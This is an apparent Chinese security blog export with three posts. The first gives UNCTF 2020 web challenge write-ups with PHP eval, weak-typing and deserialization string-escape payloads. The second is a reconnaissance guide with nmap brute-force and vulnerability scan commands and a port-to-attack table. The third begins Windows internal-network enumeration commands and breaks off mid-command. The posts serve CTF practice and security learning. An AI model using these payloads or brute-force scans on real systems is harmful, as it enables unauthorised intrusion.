<p><a href="https://www.cnblogs.com/yesec/p/12580978.html">参考文章</a></p>
<hr>
<h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\(.*\)/&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">&#x27;flag&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">&#x27;ByeBye hacker&#x27;</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<blockquote>
<p>?a=include $_GET[“zsz”] ?&gt;&amp;zsz=php://filter/read=convert.base64-encode/resource=flag.php</p>
</blockquote>
<p><img src="/2020/11/15/unctf/3.png" alt="img"></p>
<p>base64解密得：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $flag=<span class="string">&#x27;FLAG&#123;581e439b-deca-4e87-a957-07d07612baa3&#125;&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><p>经典命令执行</p>
<p><img src="/2020/11/15/unctf/4.png" alt="4"></p>
<p>里面涉及很多过滤，在index.php里面</p>
<p>过滤了<code>cat</code>，所以可以用能代替<code>cat</code>的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl:显示的时候，顺便输出行号</span><br></pre></td></tr></table></figure>

<p><code>%09</code>代替空格</p>
<p><img src="/2020/11/15/unctf/5.png" alt="5"></p>
<p>查看index.php内容:</p>
<p>发现过滤内容</p>
<p><img src="/2020/11/15/unctf/8.png" alt="8"></p>
<p>style.css里面没有东西，可能flag不在这个下级目录里面</p>
<p><img src="/2020/11/15/unctf/6.png" alt="6"></p>
<p>flag被过滤了，通配符<code>?</code>来匹配</p>
<p><img src="/2020/11/15/unctf/7.png" alt="7"></p>
<p><a href="https://www.cnblogs.com/NPFS/p/13279815.html">命令执行绕过</a>    </p>
<p>感觉还是要自己总结一下，后面再总结一下吧</p>
<hr>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$password  = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;data&#x27;</span>])? $_POST[<span class="string">&#x27;data&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">&#x27;username&#x27;</span>]==$username&amp;&amp;$data_unserialize[<span class="string">&#x27;password&#x27;</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p><code>if</code>判断用的是<code>==</code>而不是<code>===</code>,利用php弱类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username&#x3D;&#39;aaaaa&#39;;</span><br><span class="line">$data&#x3D;[</span><br><span class="line">    &#39;username&#39;&#x3D;&gt;true,</span><br><span class="line">    &#39;password&#39;&#x3D;&gt;true,</span><br><span class="line">];</span><br><span class="line">$p1&#x3D;serialize($data);</span><br><span class="line">echo $p1;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<p>POST传入即可</p>
<hr>
<p>收集总结一下php弱类型：</p>
<ul>
<li><p><code>==</code>和<code>===</code>区别：</p>
<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
</li>
<li><p>“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p>
</li>
<li><p>“1admin”==1 比较的时候会将1admin转化成数值,结果为1，</p>
</li>
<li><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
</li>
</ul>
<p>很多题可以用php弱类型绕过</p>
<hr>
<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname&#x3D;$uname;</span><br><span class="line">        $this-&gt;password&#x3D;$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">            if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;easy&#39;)</span><br><span class="line">            &#123;</span><br><span class="line">                include(&#39;flag.php&#39;);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &#39;wrong password&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;challenge&#39;,&#39;easychallenge&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname&#x3D;$_GET[1];</span><br><span class="line">$password&#x3D;1;</span><br><span class="line">$ser&#x3D;filter(serialize(new a($uname,$password)));</span><br><span class="line">$test&#x3D;unserialize($ser);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>php反序列化+字符串逃逸</p>
<blockquote>
<p>先反序列化：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname&#x3D;$uname;</span><br><span class="line">        $this-&gt;password&#x3D;$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">            if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;easy&#39;)</span><br><span class="line">            &#123;</span><br><span class="line">                include(&#39;flag.php&#39;);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &#39;wrong password&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;challenge&#39;,&#39;easychallenge&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname&#x3D;$_GET[1];</span><br><span class="line">$password&#x3D;1;</span><br><span class="line">$ser&#x3D;serialize(new a($uname,$password));</span><br><span class="line">var_dump($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>当我们传入<code>?1=test</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/15/unctf/10.png" alt="10"></p>
<blockquote>
<p>在逃逸构造：</p>
</blockquote>
<p>我们知道我们的uname是可控的，但是我们密码是不可控的，我要拿flag必须构造出password=’easy’</p>
<p>下面就是我们构造的关键部分</p>
<figure class="highlight plain"><figcaption><span>filter($string)&#123;</span></figcaption><table><tr><td class="code"><pre><span class="line">    function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;challenge&#39;,&#39;easychallenge&#39;,$string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们传入chanllenge是，chanllenge会被替换成easychallenge</p>
<p>uname每有一个changllenge,   uname长度增加4,这样我们可以通过闭合，构造password=’easy’，</p>
<p>“;s:8:”password”;s:4:”easy”;}共有29个字符，不是4的倍数后面加3个字符就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;</span><br><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa</span><br></pre></td></tr></table></figure>

<p>{s:5:”uname”;s:104:”challengechallengechallengechallengechallengechallengechallengechallenge”;s:8:”password”;s:4:”easy”;}<code>aaa&quot;;s:8:&quot;password&quot;;i:1;&#125;</code>标记的部分由于前面的执行过了，就不能执行被丢弃了</p>
<p><img src="/2020/11/15/unctf/9.png" alt="9"></p>
<p>上面这种情况是字符串变成引起的。</p>
<p>还有字符串变短也会引起字符串逃逸</p>
<p><a href="https://www.cnblogs.com/hello-there/p/12870541.html">参考文章</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>unctf2020</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2022/03/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>参考</p>
<p>本文参考：<a href="https://github.com/Qftm/Information_Collection_Handbook">https://github.com/Qftm/Information_Collection_Handbook</a></p>
<h1 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h1><p>查询域名是否已经被注册，以及注册域名和注册人的详细信息</p>
<h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><ul>
<li>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li>
<li>国外：       <a href="https://www.whois.com/">https://www.whois.com/</a></li>
<li>腾讯云：  <a href="https://whois.cloud.tencent.com/domain?domain=">https://whois.cloud.tencent.com/domain?domain=</a></li>
</ul>
<a id="more"></a>

<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><ul>
<li><a href="https://www.sec.gov/edgar/searchedgar/companysearch.html">美国企业备案查询</a></li>
<li><a href="http://www.beianbeian.com/">ICP备案查询网</a></li>
<li><a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action">工业和信息化部ICP/IP/域名信息备案管理</a></li>
</ul>
<h3 id="信用信息查询"><a href="#信用信息查询" class="headerlink" title="信用信息查询"></a>信用信息查询</h3><ul>
<li><p><a href="http://www.gsxt.gov.cn/index.html">国家企业信用信息公示系统</a></p>
</li>
<li><p><a href="http://company.xizhi.com/">悉知-全国企业信息查询</a></p>
</li>
<li><p><a href="https://www.creditchina.gov.cn/">信用中国-个人信用查询搜索-企业信息查询搜索-统一社会信用代码查询</a></p>
</li>
</ul>
<h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>myip.ms</p>
<p>TCPIPUTILS</p>
<p>DNSlytics</p>
<p>个人暂时没有用过</p>
<h3 id="应用信息"><a href="#应用信息" class="headerlink" title="应用信息"></a>应用信息</h3><p><a href="https://www.tianyancha.com/">天眼查-商业安全工具</a></p>
<hr>
<h1 id="反查（ip-域名）"><a href="#反查（ip-域名）" class="headerlink" title="反查（ip/域名）"></a>反查（ip/域名）</h1><h3 id="Dnslytics"><a href="#Dnslytics" class="headerlink" title="Dnslytics"></a>Dnslytics</h3><p><a href="https://dnslytics.com/">https://dnslytics.com/</a></p>
<hr>
<h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><ul>
<li><a href="http://tool.chinaz.com/subdomain/?domain=">站长工具</a></li>
<li><a href="https://hackertarget.com/find-dns-host-records/">hackertarget</a></li>
<li><a href="https://phpinfo.me/domain/">phpinfo</a></li>
<li><a href="https://www.t1h2ua.cn/tools/">t1h2ua</a></li>
<li><a href="https://dnsdumpster.com/">dnsdumpster</a></li>
<li><a href="http://z.zcjun.com/">zcjun</a></li>
</ul>
<p>phpinfo  还行</p>
<h3 id="枚举工具"><a href="#枚举工具" class="headerlink" title="枚举工具"></a>枚举工具</h3><p><a href="https://github.com/shmilylty/OneForAll">OneForAll</a></p>
<p>Layer</p>
<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>google hack ：site:xxx</p>
<p>FOFA，hunter等（domain:xxxxx）</p>
<hr>
<h1 id="域名对应ip"><a href="#域名对应ip" class="headerlink" title="域名对应ip"></a>域名对应ip</h1><h3 id="判断是否有CDN"><a href="#判断是否有CDN" class="headerlink" title="判断是否有CDN"></a>判断是否有CDN</h3><ol>
<li>多地ping，查看ip是否改变</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ping.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Nslookup    通过不用DNS解析目标域名，  结果不一样可能存在CDN</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup www.dfle.com.cn 8.8.8.8</span><br><span class="line">nslookup www.dfle.com.cn 114.114.114.114</span><br><span class="line">nslookup www.dfle.com.cn                       Nslookup    默认解析</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>利用工具检测</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cdnplanet        https:&#x2F;&#x2F;www.cdnplanet.com&#x2F;tools&#x2F;cdnfinder&#x2F;</span><br></pre></td></tr></table></figure>



<h3 id="绕过CND查真实ip查询"><a href="#绕过CND查真实ip查询" class="headerlink" title="绕过CND查真实ip查询"></a>绕过CND查真实ip查询</h3><ol>
<li>目标邮件服务器一般没有CDN</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">目标网站的邮箱注册、找回密码或者RSS订阅</span><br><span class="line">功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名,</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>国外ping</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tools.ipip.net&#x2F;newping.php</span><br><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>国外DNS解析</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.ab173.com&#x2F;dns&#x2F;dns_world.php</span><br><span class="line">nslookup    www.xxx.com   *.*.*.*</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>一般主域名没有什么功能，不会添加CND，对应子域可能会添加CDN。</li>
</ol>
<p>有可能子域ip和和主域名ip一样，或者在一个c端。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;bing.php</span><br></pre></td></tr></table></figure>







<ol>
<li>国外请求</li>
</ol>
<h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>shodan:     <a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<p>zoomeye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<p>fafa:            <a href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p>
<p>hunter:       <a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
<ol>
<li>(结合脚本，进行批量) </li>
<li>能够快速发现目标网站的一些服务</li>
</ol>
<hr>
<h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap      可以细扫端口和漏洞</span><br><span class="line"></span><br><span class="line">nmap -T4 -A -v -Pn </span><br><span class="line"></span><br><span class="line">（扫描端口并且标记可以爆破的服务）</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute </span><br><span class="line"></span><br><span class="line">判断常见的漏洞并扫描端口</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;auth,vuln</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">精确判断漏洞并扫描端口</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Masscan   主要全端口扫描</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>
<p>masscan+nmap</p>
<p>全端口+服务探测 （copy的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># masscan 192.33.6.145 -p1-65535  --rate 1000 -oL ports</span><br><span class="line"></span><br><span class="line"># ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $3&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39;  | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39; | sed &#39;s&#x2F;^,,&#x2F;&#x2F;&#39;)</span><br><span class="line"></span><br><span class="line"># nmap -sV -p $ports 192.33.6.145</span><br></pre></td></tr></table></figure>







<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Zmap</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a></p>
<h3 id="网络空间搜索引擎-1"><a href="#网络空间搜索引擎-1" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>fofa，hunter</p>
<p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
<p><a href="https://hunter.qianxin.com/">鹰图平台 (qianxin.com)</a></p>
<h3 id="浏览器插件-1"><a href="#浏览器插件-1" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>fofa-view</p>
<p>TCPIPUTILS</p>
<h3 id="端口利用"><a href="#端口利用" class="headerlink" title="端口利用"></a>端口利用</h3><p>copy的 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：21 服务：FTP&#x2F;TFTP&#x2F;VSFTPD 总结：爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</span><br><span class="line">端口：22 服务：ssh远程连接      总结：爆破&#x2F;openssh漏洞</span><br><span class="line">端口：23 服务：Telnet远程连接   总结：爆破&#x2F;嗅探&#x2F;弱口令</span><br><span class="line">端口：25 服务：SMTP邮件服务     总结：邮件伪造</span><br><span class="line">端口：53 服务：DNS域名解析系统   总结：域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</span><br><span class="line">端口：67&#x2F;68 服务：dhcp服务      总结：劫持&#x2F;欺骗</span><br><span class="line">端口：110 服务：pop3              总结：爆破&#x2F;嗅探</span><br><span class="line">端口：139 服务：Samba服务         总结：爆破&#x2F;未授权访问&#x2F;远程命令执行</span><br><span class="line">端口：143 服务：Imap协议         总结：爆破161SNMP协议爆破&#x2F;搜集目标内网信息</span><br><span class="line">端口：389 服务：Ldap目录访问协议 总结：注入&#x2F;未授权访问&#x2F;弱口令</span><br><span class="line">端口：445 服务：smb              总结：ms17-010&#x2F;端口溢出</span><br><span class="line">端口：512&#x2F;513&#x2F;514 服务：Linux Rexec服务 总结：爆破&#x2F;Rlogin登陆</span><br><span class="line">端口：873 服务：Rsync服务                 总结：文件上传&#x2F;未授权访问</span><br><span class="line">端口：1080 服务：socket                  总结：爆破</span><br><span class="line">端口：1352 服务：Lotus domino邮件服务   总结：爆破&#x2F;信息泄漏</span><br><span class="line">端口：1433 服务：mssql                  总结：爆破&#x2F;注入&#x2F;SA弱口令</span><br><span class="line">端口：1521 服务：oracle       总结：爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell2049Nfs服务配置不当</span><br><span class="line">端口：2181 服务：zookeeper服务            总结：未授权访问</span><br><span class="line">端口：2375 服务：docker remote api    总结：未授权访问</span><br><span class="line">端口：3306 服务：mysql                 总结：爆破&#x2F;注入</span><br><span class="line">端口：3389 服务：Rdp远程桌面链接        总结：爆破&#x2F;shift后门</span><br><span class="line">端口：4848 服务：GlassFish控制台       总结：爆破&#x2F;认证绕过</span><br><span class="line">端口：5000 服务：sybase&#x2F;DB2数据库      总结：爆破&#x2F;注入&#x2F;提权</span><br><span class="line">端口：5432 服务：postgresql             总结：爆破&#x2F;注入&#x2F;缓冲区溢出</span><br><span class="line">端口：5632 服务：pcanywhere服务        总结：抓密码&#x2F;代码执行</span><br><span class="line">端口：5900 服务：vnc                     总结：爆破&#x2F;认证绕过</span><br><span class="line">端口：6379 服务：Redis数据库           总结：未授权访问&#x2F;爆破</span><br><span class="line">端口：7001&#x2F;7002 服务：weblogic         总结：java反序列化&#x2F;控制台弱口令</span><br><span class="line">端口：80&#x2F;443 服务：http&#x2F;https         总结：web应用漏洞&#x2F;心脏滴血</span><br><span class="line">端口：8069 服务：zabbix服务            总结：远程命令执行&#x2F;注入</span><br><span class="line">端口：8161 服务：activemq             总结：弱口令&#x2F;写文件</span><br><span class="line">端口：8080&#x2F;8089 服务：Jboss&#x2F;Tomcat&#x2F;Resin 总结：爆破&#x2F;PUT文件上传&#x2F;反序列化</span><br><span class="line">端口：8083&#x2F;8086 服务：influxDB         总结：未授权访问</span><br><span class="line">端口：9000 服务：fastcgi                 总结：远程命令执行</span><br><span class="line">端口：9090 服务：Websphere             总结：控制台爆破&#x2F;java反序列化&#x2F;弱口令</span><br><span class="line">端口：9200&#x2F;9300 服务：elasticsearch   总结：远程代码执行</span><br><span class="line">端口：11211 服务：memcached             总结：未授权访问</span><br><span class="line">端口：27017&#x2F;27018 服务：mongodb         总结：未授权访问&#x2F;爆破</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><h3 id="在线平台"><a href="#在线平台" class="headerlink" title="在线平台"></a>在线平台</h3><p>潮汐 (<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a>)</p>
<p>云溪  (<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a>)   收费</p>
<p> (bugscaner.com)(<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a>)</p>
<p>(shuziguanxing.com)(<a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a>)</p>
<p>GoeEye平台 (<a href="https://www.godeye.vip/index/">https://www.godeye.vip/index/</a>)</p>
<h3 id="github工具"><a href="#github工具" class="headerlink" title="github工具"></a>github工具</h3><p>WhatWeb</p>
<p><a href="https://github.com/TideSec/TideFinger">TideFinger</a></p>
<p><a href="https://github.com/Tuhinshubhra/CMSeeK">Tuhinshubhra/CMSeeK: CMS Detection and Exploitation suite - Scan WordPress, Joomla, Drupal and over 180 other CMSs (github.com)</a></p>
<p><a href="https://github.com/Lucifer1993/AngelSword">Lucifer1993/AngelSword: Python3编写的CMS漏洞检测框架 (github.com)</a></p>
<h3 id="浏览器插件-2"><a href="#浏览器插件-2" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>Wappalyzer</p>
<h1 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h1><h3 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h3><p>wafw00f</p>
<p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
<h3 id="google-hack语法"><a href="#google-hack语法" class="headerlink" title="google hack语法"></a>google hack语法</h3><p>site:xxx.com intext:管理</p>
<p>site:xxx.com inurl:login/admin</p>
<p>site:xxx.com intitle:后台</p>
<p>site:xxx.com filetype:文件的格式 </p>
<h3 id="jsfinder"><a href="#jsfinder" class="headerlink" title="jsfinder"></a>jsfinder</h3><p>JSFinder</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install requests bs4</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Threezh1&#x2F;JSFinder.git  快速提取js中的子域名</span><br></pre></td></tr></table></figure>

<p>魔改：<br><a href="https://github.com/msfisgood/JSFinderAAA">msfisgood/JSFinderAAA: JSFinder魔改版 (github.com)</a></p>
<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li>dirsearch</li>
<li>dirmap</li>
</ul>
<h1 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h1><p><a href="https://wiki.96.mk/">https://wiki.96.mk/</a></p>
<p><a href="https://wiki.bylibrary.cn/">https://wiki.bylibrary.cn/</a></p>
<p><a href="https://qftm.github.io/Information_Collection_Handbook/exploit-database/domestic.html">国内 · Information Collection Handbook (qftm.github.io)</a></p>
<p><a href="https://qftm.github.io/Information_Collection_Handbook/exploit-database/foreign.html">国外 · Information Collection Handbook (qftm.github.io)</a></p>
<p>cve仓库等：</p>
<p><a href="http://vul.tidesec.com/">Tide潮听漏洞情报平台 (tidesec.com)</a></p>
<p><a href="https://avd.aliyun.com/">阿里云漏洞库 (aliyun.com)</a></p>
<p><a href="https://unsafe.sh/cve">unsafe.sh - 不安全</a></p>
<p>在线工具：</p>
<p><a href="https://hackertarget.com/">https://hackertarget.com/</a>  </p>
<p><a href="https://lovebear.top/info/cn/index.html">https://lovebear.top/info/cn/index.html</a></p>
<p><a href="https://lovebear.top/info/cn/index.html">https://lovebear.top/info/cn/index.html</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>内网信息收集</title>
    <url>/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="windows信息收集"><a href="#windows信息收集" class="headerlink" title="windows信息收集"></a>windows信息收集</h2><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">ipconfig &#x2F;all  #是否在域内，网卡信息等</span><br><span class="line"></span><br><span class="line">systeminfo  #查看主机信息，os名称，版本，域，补丁</span><br><span class="line">（要提取的话根据补丁，寻找https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquan）</span><br><span class="line"></span><br><span class="line">net user       #本机用户列表</span><br><span class="line">net localgroup administrators  #本地管理员</span><br><span class="line"></span><br><span class="line">wmic product get name,version   #查看安装软件版本</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property 